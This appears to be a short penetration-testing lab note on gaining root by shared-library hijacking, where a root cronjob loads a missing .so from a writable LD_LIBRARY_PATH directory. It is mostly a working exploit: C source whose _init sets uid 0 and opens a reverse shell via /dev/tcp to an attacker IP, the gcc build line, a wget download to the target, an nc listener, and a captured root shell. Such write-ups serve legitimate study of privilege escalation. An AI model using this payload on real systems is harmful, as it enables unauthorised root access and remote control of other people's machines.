
## When?

When an binary isn't able to execute because an module is missing .h or .so file.

## PoC

Creating malicious .c script locally.

Note: that if we have information on an error, or output that it requires an "init_plugin" or another name, change the function name from _init to "init_plugin".

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {

    setgid(0);
    setuid(0);
    system("bash -i >& /dev/tcp/192.168.45.167/22 0>&1");
}
```

Compiling it into the file we need e.G "utils.so", which is needed for an binary to work

```
gcc -shared -fPIC -nostartfiles exploit.c -o utils.so
```

Started up an python web server.

```
python3 -m http.server 80
```

Downloaded the file onto the target system into the /usr/local/lib/dev directory.

```
wget http://192.168.45.167/utils.so
```

Since this .so file is getting processed through the cronjob running on root, we should be able to get RCE as user "root".

Let's start up an listener on port 22, since our malicious script is configured for this port.

```
nc -lvnp 22
```

Gained RCE as user "root".

```
nc -lvnp 22                                
listening on [any] 22 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.198.93] 44634
bash: no job control in this shell
[root@sybaris ~]#
```

## Example

Cronjob with root rights executing an binary called /usr/bin/log-sweeper, when running this binary we identified that it needs an file called utils.so. From the cronjob we get the information that the LD_LIBRARY_PATH is set to /usr/local/lib/dev. --> Do we have write access? 

Yes, we have.

```
[pablo@sybaris users]$ find / -type d -writable 2>/dev/null
/usr/local/lib/dev
```

Putting our malicious file into the directory --> Gained Root rights.